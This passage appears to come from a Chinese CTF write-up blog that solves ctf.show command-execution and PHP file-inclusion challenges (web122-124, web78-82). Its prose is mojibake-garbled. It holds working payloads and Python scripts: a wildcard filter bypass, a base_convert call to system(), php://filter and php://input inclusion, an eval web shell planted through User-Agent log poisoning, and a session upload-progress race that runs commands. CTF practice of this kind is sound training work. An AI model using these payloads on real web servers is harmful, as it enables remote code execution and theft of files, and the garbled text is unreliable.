<p>è¿™æ¬¡æŠŠ<code>PWD</code>å’Œ<code>#</code>éƒ½ç»™ç¦äº†ğŸ˜¢ï¼Œè¿™æ¬¡æˆ‘ä»¬æ¢å¦ä¸€ä¸ªå‘½ä»¤<code>/bin/base64</code>ï¼Œè¿™æ¬¡æ”¾å¼€äº†HOMEï¼Œæˆ‘ä»¬å°±ç”¨HOMEæ¥è·å–<code>/</code>ï¼Œæ•°å­—1çš„è¯æˆ‘ä»¬æ²¡æ³•ä½¿ç”¨<code>$&#123;##&#125;</code>äº†ï¼Œè¿™é‡Œä½¿ç”¨<code>$?</code></p>
<blockquote>
<p><code>$?</code> æœ€åè¿è¡Œçš„å‘½ä»¤çš„ç»“æŸä»£ç ï¼ˆè¿”å›å€¼ï¼‰å³æ‰§è¡Œä¸Šä¸€ä¸ªæŒ‡ä»¤çš„è¿”å›å€¼ (æ˜¾ç¤ºæœ€åå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ã€‚0è¡¨ç¤ºæ²¡æœ‰é”™è¯¯ï¼Œå…¶ä»–ä»»ä½•å€¼è¡¨æ˜æœ‰é”™è¯¯)</p>
</blockquote>
<p>è¿™é‡Œæ‰¾äº†å‡ ä¸ªæŠ¥é”™èµ„æ–™å’Œå¯¹åº”çš„å€¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;OS error code   1:  Operation not permitted&quot;</span><br><span class="line">&quot;OS error code   2:  No such file or directory&quot;</span><br><span class="line">&quot;OS error code   3:  No such process&quot;</span><br><span class="line">&quot;OS error code   4:  Interrupted system call&quot;</span><br><span class="line">&quot;OS error code   5:  Input&#x2F;output error&quot;</span><br><span class="line">&quot;OS error code   6:  No such device or address&quot;</span><br><span class="line">&quot;OS error code   7:  Argument list too long&quot;</span><br><span class="line">&quot;OS error code   8:  Exec format error&quot;</span><br><span class="line">&quot;OS error code   9:  Bad file descriptor&quot;</span><br><span class="line">&quot;OS error code  10:  No child processes&quot;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨<code>&lt;A</code>çš„æŠ¥é”™å°±èƒ½è¿”å›å€¼1ï¼Œæ ¹æ®é¢˜ç›®fuzzæç¤ºï¼Œåé¢çš„base64ä¸­çš„4æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>$&#123;RANDOM&#125;</code>æ¥è·å¾—(å› ä¸ºå…·æœ‰éšæœºæ€§ï¼Œæ‰€ä»¥è¦å¤šå°è¯•ç›´åˆ°éšæœºå‡º4æ¥)ï¼Œåˆ°è¿™é‡Œæ€è·¯å¾ˆæ¸…æ™°äº†ï¼Œæ„é€ paylaod</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure>
<p>å†™ä¸ªè„šæœ¬æ¥è·‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/19 12:17</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3f405f9a-8ca5-4519-aef8-95943df5d5de.chall.ctf.show:8080/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="string">r&#x27;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    result = requests.post(url=url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;PD9waHA&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        print(result.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web122/D%40_HYTR%28%5B9%7D6%29KJBT45VBDF.png" alt=""><br>
å†è¿›è¡Œbase64è§£ç å³å¯å¾—åˆ°flag</p>
<h3 id="web124"><a class="header-anchor" href="#web124">Â¶</a>web124</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ†æä¸€æ³¢æºç ï¼Œgetä¼ å‚cï¼Œå¹¶ä¸”é•¿åº¦ä¸èƒ½è¶…è¿‡80ï¼Œè®¾ç½®äº†é»‘åå•å’Œç™½åå•å’Œæ­£åˆ™è¿‡æ»¤ã€‚æŒ‰ç…§æç¤ºæˆ‘ä»¬å»æ‰¾æ‰¾ä¸€äº›æ•°å­¦å‡½æ•°è¿›è¡Œä½¿ç”¨ï¼Œè¿™ä¹ˆå¤šç™½åå•ä¹Ÿæ³¨å®šäº†æœ‰å¤šç§payloadï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨<code>base_convert()</code>å’Œ<code>getallheaders</code>é…åˆä½¿ç”¨<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web124/RJK%29FW%25W%5DI%7D7HR%5DPECDK0HP.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web124/EPWLSILUL%6048%40%24PDH%259AEAN.png" alt=""><br>
æ³¨æ„ï¼Œå› ä¸ºæ­£åˆ™ä¼šåŒ¹é…å­—æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡<code>base_convert()</code>è¿›è¡Œä¸€ä¸ªè½¬æ¢</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">&#x27;system&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">//å¾—åˆ°1751504350ï¼Œä»36è¿›åˆ¶è½¬æ¢åˆ°10è¿›åˆ¶ï¼Œ36è¿›åˆ¶åŒ…å«10ä¸ªæ•°å­—å’Œ26ä¸ªå­—æ¯</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">&#x27;getallheaders&#x27;</span>,<span class="number">30</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">//å¾—åˆ°8768397090111664438ï¼Œè¿™é‡Œä¸ä½¿ç”¨36è¿›åˆ¶æ˜¯å› ä¸ºç²¾åº¦ä¼šä¸¢å¤±ï¼Œå°è¯•åˆ°30çš„æ—¶å€™æˆåŠŸ</span></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æ„é€ payloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$pi&#x3D;base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) </span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œç”¨ä¸€ä¸ªå˜é‡æ¥ç¼©å°payloadé•¿åº¦ï¼Œä½†æ³¨æ„å˜é‡åè¦å–ç™½åå•ä¸­çš„åå­—è¿›è¡Œå‘½åï¼Œå¦åˆ™ä¼šè¢«ban<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web124/T%29W51CB%29N5TQ4%5B66Y8EECDJ.png" alt=""><br>
æˆåŠŸè·å¾—flag</p>
<h2 id="æ–‡ä»¶åŒ…å«-78-88-116-117"><a class="header-anchor" href="#æ–‡ä»¶åŒ…å«-78-88-116-117">Â¶</a>æ–‡ä»¶åŒ…å«(78-88&amp;116-117)</h2>
<h3 id="web78"><a class="header-anchor" href="#web78">Â¶</a>web78</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¼€å§‹æ–‡ä»¶åŒ…å«çš„é¢˜å‹äº†ï¼Œè¿™é‡Œä½¿ç”¨phpä¼ªåè®®php://filteræ¥æ„é€ paylaod</p>
<blockquote>
<p>é¦–å…ˆè¿™æ˜¯ä¸€ä¸ªfileå…³é”®å­—çš„getå‚æ•°ä¼ é€’ï¼Œphp://æ˜¯ä¸€ç§åè®®åç§°ï¼Œphp://filter/æ˜¯ä¸€ç§è®¿é—®æœ¬åœ°æ–‡ä»¶çš„åè®®ï¼Œ/read=convert.base64-encode/è¡¨ç¤ºè¯»å–çš„æ–¹å¼æ˜¯base64ç¼–ç åï¼Œresource=index.phpè¡¨ç¤ºç›®æ ‡æ–‡ä»¶ä¸ºindex.phpã€‚</p>
<p>é€šè¿‡ä¼ é€’è¿™ä¸ªå‚æ•°å¯ä»¥å¾—åˆ°index.phpçš„æºç ï¼Œä¸‹é¢è¯´è¯´ä¸ºä»€ä¹ˆï¼Œçœ‹åˆ°æºç ä¸­çš„includeå‡½æ•°ï¼Œè¿™ä¸ªè¡¨ç¤ºä»å¤–éƒ¨å¼•å…¥phpæ–‡ä»¶å¹¶æ‰§è¡Œï¼Œå¦‚æœæ‰§è¡Œä¸æˆåŠŸï¼Œå°±è¿”å›æ–‡ä»¶çš„æºç ã€‚</p>
<p>è€Œincludeçš„å†…å®¹æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ï¼Œæ‰€ä»¥é€šè¿‡æˆ‘ä»¬ä¼ é€’çš„fileå‚æ•°ï¼Œæ˜¯includeï¼ˆï¼‰å‡½æ•°å¼•å…¥äº†index.phpçš„base64ç¼–ç æ ¼å¼ï¼Œå› ä¸ºæ˜¯base64ç¼–ç æ ¼å¼ï¼Œæ‰€ä»¥æ‰§è¡Œä¸æˆåŠŸï¼Œè¿”å›æºç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—åˆ°äº†æºç çš„base64æ ¼å¼ï¼Œè§£ç å³å¯ã€‚</p>
</blockquote>
<p>payloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<p>è¯»å–å‡ºæ¥æ˜¯base64ï¼Œå†æ‹¿å»è¿›è¡Œbase64è§£ç å³å¯å¾—åˆ°flag</p>
<h3 id="web79"><a class="header-anchor" href="#web79">Â¶</a>web79</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡æŠŠphpå’Œé€šé…ç¬¦è¿‡æ»¤äº†ï¼Œphpä¼ªåè®®å¤§å°å†™å¯ä»¥ç»•è¿‡ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œä½¿ç”¨php://inputä¼ªåè®®ï¼Œpaylaodå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;Php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">postï¼š&lt;?php system(&quot;tac flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web79/0C4K%40R_MQ2W%282D%40VEF%7DHV37.png" alt=""></p>
<h3 id="web80"><a class="header-anchor" href="#web80">Â¶</a>web80</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡å¤šè¿‡æ»¤äº†ä¸€ä¸ªdataï¼Œå¯ä»¥ç»§ç»­ä½¿ç”¨ä¸Šé¢˜php:inputåè®®ï¼Œä¸è¿‡æ³¨æ„è¿™æ¬¡æ–‡ä»¶åå­—æ”¹äº†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web80/~4EFI%24V_L~8E%24U_CGIDW5%5D1.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web80/YG%60%7DUF%5D%5D~P6HJ%40~2KA4%5D949.png" alt=""><br>
æ‰€ä»¥payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;Php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">postï¼š&lt;?php system(&quot;tac fl0g.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="web81"><a class="header-anchor" href="#web81">Â¶</a>web81</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡æŠŠ:ç»™banäº†ï¼Œé¢˜ç›®æç¤ºä½¿ç”¨æ—¥å¿—åŒ…å«ï¼Œä¹‹å‰éƒ½æ˜¯æ‰‹å·¥å‘åŒ…ï¼Œè¿™æ¬¡å†™ä¸ªè„šæœ¬æ¥è·‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/20 19:51</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://893b0ed2-2497-41f3-b056-c5617165c2f3.chall.ctf.show:8080/&quot;</span> + <span class="string">&quot;?file=/var/log/nginx/access.log&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0&lt;?php @eval($_POST[dotast]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;dotast&#x27;</span>: <span class="string">&#x27;system(&quot;cat fl0g.php&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = requests.get(url=url, headers=headers)</span><br><span class="line">result = requests.post(url=url, data=data)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œå¾—åˆ°flag</p>
<h3 id="web82"><a class="header-anchor" href="#web82">Â¶</a>web82</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡æŠŠ<code>.</code>ç»™è¿‡æ»¤äº†ï¼Œæ—¥å¿—åŒ…å«ä½¿ç”¨ä¸äº†ï¼Œæˆ‘ä»¬ä½¿ç”¨sessionæ–‡ä»¶åŒ…å«ï¼Œå…ˆäº†è§£ä¸€äº›çŸ¥è¯†ç‚¹ï¼Œåœ¨php5.4ä¹‹åphp.iniå¼€å§‹æœ‰å‡ ä¸ªé»˜è®¤é€‰é¡¹</p>
<blockquote>
<p>1.session.upload_progress.enabled = on<br>
2.session.upload_progress.cleanup = on<br>
3.session.upload_progress.prefix = â€œupload_progress_â€<br>
4.session.upload_progress.name = â€œPHP_SESSION_UPLOAD_PROGRESSâ€<br>
5.session.use_strict_mode=off</p>
<p>ç¬¬ä¸€ä¸ªè¡¨ç¤ºå½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­<br>
ç¬¬äºŒä¸ªè¡¨ç¤ºå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹<br>
ç¬¬ä¸‰å’Œç¬¬å››ä¸ª<code>prefix+name</code>å°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å<br>
ç¬¬äº”ä¸ªè¡¨ç¤ºæˆ‘ä»¬å¯¹Cookieä¸­sessionIDå¯æ§</p>
</blockquote>
<p>ç®€è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>session.upload_progress</code>å°†æœ¨é©¬å†™å…¥sessionæ–‡ä»¶ï¼Œç„¶ååŒ…å«è¿™ä¸ªsessionæ–‡ä»¶ã€‚ä¸è¿‡å‰ææ˜¯æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªsessionæ–‡ä»¶ï¼Œå¹¶ä¸”çŸ¥é“sessionæ–‡ä»¶çš„å­˜æ”¾ä½ç½®ã€‚å› ä¸º<code>session.use_strict_mode=off</code>çš„å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰sessionID<br>
linuxç³»ç»Ÿä¸­sessionæ–‡ä»¶ä¸€èˆ¬çš„é»˜è®¤å­˜å‚¨ä½ç½®ä¸º /tmp æˆ– /var/lib/php/session</p>
<p>ä¾‹å¦‚æˆ‘ä»¬åœ¨Cookieä¸­è®¾ç½®äº†PHPSESSID=flagï¼Œphpä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºæ–‡ä»¶ï¼š/tmp/sess_flagï¼Œå³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–sessionï¼Œphpä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚ å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œä¸º<code>prefix+name</code>çš„å€¼ï¼Œæœ€åè¢«å†™å…¥sess_æ–‡ä»¶é‡Œ<br>
è¿˜æœ‰ä¸€ä¸ªå…³é”®ç‚¹å°±æ˜¯<code>session.upload_progress.cleanup</code>é»˜è®¤æ˜¯å¼€å¯çš„ï¼Œåªè¦è¯»å–äº†postæ•°æ®ï¼Œå°±ä¼šæ¸…é™¤è¿›åº¦ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ©ç”¨æ¡ä»¶ç«äº‰æ¥passï¼Œå†™ä¸€ä¸ªè„šæœ¬æ¥å®Œæˆ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/20 23:51</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://453228ae-28f2-4bb0-b401-83514feae8df.chall.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;dotast&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">10</span>)</span><br><span class="line">        response = session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>&#125;, data=data, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;dota.txt&#x27;</span>, f)&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;?file=/tmp/sess_flag&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;dotast&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    write = threading.Thread(target=write, args=(session,))</span><br><span class="line">    write.daemon = <span class="literal">True</span></span><br><span class="line">    write.start()</span><br><span class="line">    read(session)</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œåå¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web82/S%29PR%28L6K%282%5B1%29_%5DKLZAS8%5BM.png" alt=""></p>
<h3 id="web83"><a class="header-anchor" href="#web83">Â¶</a>web83</h3>
